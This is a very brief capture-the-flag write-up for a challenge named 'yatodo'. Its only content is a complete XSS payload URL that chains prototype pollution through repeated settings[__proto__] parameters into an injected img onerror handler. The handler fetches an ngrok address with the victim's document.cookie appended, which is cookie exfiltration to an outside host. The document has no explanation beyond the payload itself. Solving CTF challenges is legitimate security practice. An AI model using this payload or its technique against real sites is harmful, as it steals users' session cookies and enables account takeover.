# yatodo

## Write-up

- XSS Payload: `http://yatodo.chal.ctf.gdgalgiers.com/?settings[__proto__]=__proto__&settings[__proto__]=$$inject&settings[__proto__]=xss&settings[__proto__]=<img src onerror=fetch('http://8dfc-197-118-147-239.ngrok.io/'.concat(document.cookie)).then().catch()></img>`.
